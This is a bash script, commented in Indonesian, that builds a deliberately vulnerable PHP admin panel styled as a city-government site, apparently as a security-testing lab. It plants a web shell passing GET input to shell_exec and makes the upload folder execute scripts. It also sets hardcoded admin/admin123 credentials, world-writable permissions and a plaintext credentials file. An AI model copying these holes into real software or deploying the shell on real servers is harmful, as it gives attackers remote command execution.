#!/bin/bash

# =================================================================
# SETUP ADMIN PANEL ENHANCED
# =================================================================
# Script untuk membuat admin panel vulnerable menggunakan file HTML yang sudah ada
# =================================================================

# Konfigurasi
WEB_DIR="/var/www/html"
ADMIN_DIR="$WEB_DIR/admin-panel"
APACHE_PORT="8000"
ADMIN_USER="admin"
ADMIN_PASS="admin123"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Fungsi untuk menjalankan command
run_command() {
    local cmd="$1"
    local description="$2"
    
    echo -e "${BLUE}[INFO]${NC} $description"
    
    if eval "$cmd"; then
        echo -e "${GREEN}[SUCCESS]${NC} $description berhasil"
        return 0
    else
        echo -e "${RED}[ERROR]${NC} $description gagal"
        return 1
    fi
}

# Fungsi untuk mengecek apakah user adalah root
check_root() {
    if [ "$EUID" -ne 0 ]; then
        echo -e "${RED}[ERROR]${NC} Script ini harus dijalankan sebagai root"
        exit 1
    fi
}

# Fungsi untuk instalasi dependencies
install_dependencies() {
    echo -e "${BLUE}[INFO]${NC} Menginstalasi dependencies"
    
    local packages=(
        "apache2"
        "php"
        "php-curl"
        "php-gd"
        "php-mbstring"
        "php-xml"
        "unzip"
        "wget"
        "curl"
    )
    
    for package in "${packages[@]}"; do
        run_command "apt install -y $package" "Instalasi $package"
    done
    
    echo -e "${GREEN}[SUCCESS]${NC} Instalasi dependencies selesai"
}

# Fungsi untuk konfigurasi Apache
configure_apache() {
    echo -e "${BLUE}[INFO]${NC} Mengkonfigurasi Apache"
    
    # Backup konfigurasi default
    run_command "cp /etc/apache2/sites-available/000-default.conf /etc/apache2/sites-available/000-default.conf.backup" "Backup konfigurasi Apache default"
    
    # Buat konfigurasi untuk Admin Panel
    cat > /etc/apache2/sites-available/admin-panel.conf << EOF
<VirtualHost *:$APACHE_PORT>
    ServerName admin-panel.local
    ServerAdmin webmaster@admin-panel.local
    DocumentRoot $ADMIN_DIR
    
    <Directory $ADMIN_DIR>
        AllowOverride All
        Require all granted
    </Directory>
    
    ErrorLog \${APACHE_LOG_DIR}/admin-panel_error.log
    CustomLog \${APACHE_LOG_DIR}/admin-panel_access.log combined
    
    <Directory $ADMIN_DIR/uploads>
        Options +ExecCGI +Indexes
        AddHandler cgi-script .php .pl .py .jsp .asp .sh .cgi
        AllowOverride None
        Require all granted
    </Directory>
</VirtualHost>
EOF

    # Enable mod_rewrite dan mod_cgi
    run_command "a2enmod rewrite" "Enable mod_rewrite"
    run_command "a2enmod cgi" "Enable mod_cgi"
    
    # Konfigurasi ports
    cat > /etc/apache2/ports.conf << EOF
Listen 80
Listen $APACHE_PORT

<IfModule ssl_module>
        Listen 443
</IfModule>

<IfModule mod_gnutls.c>
        Listen 443
</IfModule>
EOF

    # Enable site
    run_command "a2ensite admin-panel" "Enable admin panel site"
    run_command "a2dissite 000-default" "Disable default site"
    
    # Restart Apache
    run_command "systemctl restart apache2" "Restart Apache"
    run_command "systemctl enable apache2" "Enable Apache service"
    
    echo -e "${GREEN}[SUCCESS]${NC} Konfigurasi Apache selesai"
}

# Fungsi untuk membuat Admin Panel Enhanced
create_admin_panel() {
    echo -e "${BLUE}[INFO]${NC} Membuat Admin Panel Enhanced"
    
    # Buat struktur direktori
    run_command "mkdir -p $ADMIN_DIR/{uploads,assets,includes}" "Buat struktur direktori admin panel"
    
    # Copy file HTML yang sudah ada
    if [ -f "admin_panel_enhanced.html" ]; then
        run_command "cp admin_panel_enhanced.html $ADMIN_DIR/index.html" "Copy admin panel HTML"
    else
        echo -e "${YELLOW}[WARNING]${NC} File admin_panel_enhanced.html tidak ditemukan"
        return 1
    fi
    
    # Buat file PHP untuk backend
    cat > $ADMIN_DIR/includes/config.php << 'EOF'
<?php
session_start();

function isLoggedIn() {
    return isset($_SESSION['admin_logged_in']) && $_SESSION['admin_logged_in'] === true;
}

function requireLogin() {
    if (!isLoggedIn()) {
        header('Location: login.php');
        exit;
    }
}
?>
EOF

    # Buat file login PHP
    cat > $ADMIN_DIR/login.php << 'EOF'
<?php
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    
    if ($username === 'admin' && $password === 'admin123') {
        $_SESSION['admin_logged_in'] = true;
        $_SESSION['admin_username'] = $username;
        header('Location: index.php');
        exit;
    } else {
        $error = 'Username atau password salah!';
    }
}

if (isset($_SESSION['admin_logged_in']) && $_SESSION['admin_logged_in'] === true) {
    header('Location: index.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Login - Pemerintah Kota XX</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background: linear-gradient(135deg, #1e3a8a, #3b82f6); min-height: 100vh; }
        .login-card { background: white; border-radius: 20px; padding: 50px; box-shadow: 0 20px 60px rgba(0,0,0,0.2); }
    </style>
</head>
<body class="d-flex align-items-center justify-content-center">
    <div class="container">
        <div class="row justify-content-center">
            <div class="col-md-6">
                <div class="login-card">
                    <div class="text-center mb-4">
                        <h2 class="text-primary">Admin Login</h2>
                        <p class="text-muted">Pemerintah Kota XX</p>
                    </div>
                    
                    <?php if (isset($error)): ?>
                        <div class="alert alert-danger"><?php echo htmlspecialchars($error); ?></div>
                    <?php endif; ?>
                    
                    <form method="POST">
                        <div class="mb-3">
                            <label for="username" class="form-label">Username</label>
                            <input type="text" class="form-control" id="username" name="username" required>
                        </div>
                        <div class="mb-3">
                            <label for="password" class="form-label">Password</label>
                            <input type="password" class="form-control" id="password" name="password" required>
                        </div>
                        <button type="submit" class="btn btn-primary w-100">Login</button>
                    </form>
                    
                    <div class="text-center mt-3">
                        <small class="text-muted">Default: admin / admin123</small>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
EOF

    # Buat file dashboard PHP
    cat > $ADMIN_DIR/index.php << 'EOF'
<?php
require_once 'includes/config.php';
requireLogin();
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard - Pemerintah Kota XX</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-dark bg-primary">
        <div class="container">
            <a class="navbar-brand" href="#"><i class="fas fa-shield-alt me-2"></i>Admin Panel</a>
            <div class="navbar-nav ms-auto">
                <span class="navbar-text me-3">Welcome, <?php echo htmlspecialchars($_SESSION['admin_username']); ?></span>
                <a class="nav-link" href="logout.php"><i class="fas fa-sign-out-alt me-1"></i>Logout</a>
            </div>
        </div>
    </nav>

    <div class="container mt-4">
        <div class="row">
            <div class="col-md-6">
                <div class="card">
                    <div class="card-header">
                        <h5><i class="fas fa-upload me-2"></i>Upload File</h5>
                    </div>
                    <div class="card-body">
                        <form action="upload.php" method="POST" enctype="multipart/form-data">
                            <div class="mb-3">
                                <label for="file" class="form-label">Pilih File</label>
                                <input type="file" class="form-control" id="file" name="file" required>
                            </div>
                            <button type="submit" class="btn btn-primary">Upload File</button>
                        </form>
                    </div>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="card">
                    <div class="card-header">
                        <h5><i class="fas fa-files-o me-2"></i>File Terupload</h5>
                    </div>
                    <div class="card-body">
                        <?php
                        $upload_dir = 'uploads/';
                        if (is_dir($upload_dir)) {
                            $files = scandir($upload_dir);
                            echo '<ul class="list-group">';
                            foreach ($files as $file) {
                                if ($file != '.' && $file != '..') {
                                    echo '<li class="list-group-item d-flex justify-content-between align-items-center">';
                                    echo '<a href="uploads/' . htmlspecialchars($file) . '" target="_blank">' . htmlspecialchars($file) . '</a>';
                                    echo '<span class="badge bg-primary rounded-pill">' . filesize($upload_dir . $file) . ' bytes</span>';
                                    echo '</li>';
                                }
                            }
                            echo '</ul>';
                        } else {
                            echo '<p class="text-muted">Belum ada file yang diupload</p>';
                        }
                        ?>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
EOF

    # Buat file upload PHP
    cat > $ADMIN_DIR/upload.php << 'EOF'
<?php
require_once 'includes/config.php';
requireLogin();

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $upload_dir = 'uploads/';
    $file = $_FILES['file'];
    
    if ($file['error'] === UPLOAD_ERR_OK) {
        $filename = $file['name'];
        $destination = $upload_dir . $filename;
        
        if (move_uploaded_file($file['tmp_name'], $destination)) {
            header('Location: index.php?success=1');
            exit;
        } else {
            header('Location: index.php?error=1');
            exit;
        }
    }
}

header('Location: index.php');
exit;
?>
EOF

    # Buat file logout PHP
    cat > $ADMIN_DIR/logout.php << 'EOF'
<?php
session_start();
session_destroy();
header('Location: login.php');
exit;
?>
EOF

    # Buat .htaccess untuk file execution
    cat > $ADMIN_DIR/uploads/.htaccess << 'EOF'
Options +ExecCGI +Indexes
AddHandler cgi-script .php .pl .py .jsp .asp .sh .cgi
<FilesMatch "\.(php|pl|py|jsp|asp|sh|cgi)$">
    SetHandler cgi-script
</FilesMatch>
DirectoryIndex index.php index.html
EOF

    # Buat test shell
    cat > $ADMIN_DIR/uploads/shell.php << 'EOF'
<?php
if(isset($_GET['cmd'])) {
    $output = shell_exec($_GET['cmd']);
    echo "<pre>$output</pre>";
}
?>
<form method="GET">
    <input type="text" name="cmd" placeholder="Enter command" class="form-control">
    <input type="submit" value="Execute" class="btn btn-danger mt-2">
</form>
EOF

    # Set permissions
    run_command "chown -R www-data:www-data $ADMIN_DIR" "Set ownership admin panel"
    run_command "chmod -R 755 $ADMIN_DIR" "Set permissions admin panel"
    run_command "chmod -R 777 $ADMIN_DIR/uploads" "Set upload permissions admin panel"
    
    echo -e "${GREEN}[SUCCESS]${NC} Admin Panel Enhanced dibuat"
}

# Fungsi untuk konfigurasi firewall
configure_firewall() {
    echo -e "${BLUE}[INFO]${NC} Mengkonfigurasi firewall"
    
    # Allow ports
    run_command "ufw allow $APACHE_PORT/tcp" "Allow port $APACHE_PORT"
    run_command "ufw allow 80/tcp" "Allow port 80"
    run_command "ufw allow 22/tcp" "Allow SSH"
    
    echo -e "${GREEN}[SUCCESS]${NC} Firewall dikonfigurasi"
}

# Fungsi untuk membuat file sensitive
create_sensitive_files() {
    echo -e "${BLUE}[INFO]${NC} Membuat file sensitive"
    
    # Buat file dengan informasi sensitive Admin Panel
    cat > $ADMIN_DIR/sensitive-info.txt << EOF
=== INFORMASI SENSITIVE ADMIN PANEL ===
Website: Admin Panel Enhanced
Admin Username: $ADMIN_USER
Admin Password: $ADMIN_PASS
Upload Directory: $ADMIN_DIR/uploads
Apache Port: $APACHE_PORT
Server Info: Apache/2.4.52
PHP Version: $(php -v | head -n1)
========================
EOF

    echo -e "${GREEN}[SUCCESS]${NC} File sensitive dibuat"
}

# Fungsi untuk testing instalasi
test_installation() {
    echo -e "${BLUE}[INFO]${NC} Testing instalasi"
    
    # Test Admin Panel
    if curl -s -o /dev/null -w "%{http_code}" "http://localhost:$APACHE_PORT" | grep -q "200"; then
        echo -e "${GREEN}[SUCCESS]${NC} Admin Panel berjalan di port $APACHE_PORT"
    else
        echo -e "${RED}[ERROR]${NC} Admin Panel tidak berjalan di port $APACHE_PORT"
    fi
    
    # Test Admin Panel login page
    if curl -s "http://localhost:$APACHE_PORT/login.php" | grep -q "Admin Login"; then
        echo -e "${GREEN}[SUCCESS]${NC} Halaman login Admin Panel tersedia"
    else
        echo -e "${RED}[ERROR]${NC} Halaman login Admin Panel tidak tersedia"
    fi
    
    echo -e "${GREEN}[SUCCESS]${NC} Testing instalasi selesai"
}

# Fungsi untuk menampilkan informasi instalasi
show_installation_info() {
    echo -e "\n${BLUE}=== INFORMASI INSTALASI ADMIN PANEL ENHANCED ===${NC}"
    echo -e "${GREEN}✓${NC} Admin Panel Enhanced"
    echo -e "   - URL: http://localhost:$APACHE_PORT"
    echo -e "   - Admin: $ADMIN_USER / $ADMIN_PASS"
    echo -e "   - Login: http://localhost:$APACHE_PORT/login.php"
    echo -e "   - Upload: $ADMIN_DIR/uploads"
    echo -e ""
    echo -e "${GREEN}✓${NC} Kerentanan yang Diimplementasi"
    echo -e "   - Unrestricted File Upload"
    echo -e "   - File Execution via .htaccess"
    echo -e "   - Directory Listing"
    echo -e "   - Weak Authentication"
    echo -e "   - Session Management Issues"
    echo -e ""
    echo -e "${GREEN}✓${NC} File Sensitive"
    echo -e "   - Admin Panel: $ADMIN_DIR/sensitive-info.txt"
    echo -e "${BLUE}===============================================${NC}\n"
    
    echo -e "${YELLOW}PERINGATAN:${NC} Website ini dibuat untuk testing keamanan!"
    echo -e "${YELLOW}Jangan gunakan di lingkungan produksi!${NC}\n"
}

# Main function
main() {
    echo -e "${BLUE}=== SETUP ADMIN PANEL ENHANCED ===${NC}"
    echo -e "Membuat admin panel vulnerable menggunakan file HTML yang sudah ada"
    echo -e "${YELLOW}PERINGATAN: Website ini dibuat untuk testing keamanan!${NC}\n"
    
    # Cek root privileges
    check_root
    
    echo -e "${BLUE}[INFO]${NC} Memulai instalasi admin panel enhanced"
    
    # Install dependencies
    install_dependencies
    
    # Configure Apache
    configure_apache
    
    # Create Admin Panel Enhanced
    create_admin_panel
    
    # Configure firewall
    configure_firewall
    
    # Create sensitive files
    create_sensitive_files
    
    # Test installation
    test_installation
    
    # Show installation info
    show_installation_info
    
    echo -e "${GREEN}[SUCCESS]${NC} Instalasi admin panel enhanced selesai!"
}

# Jalankan main function
main "$@"
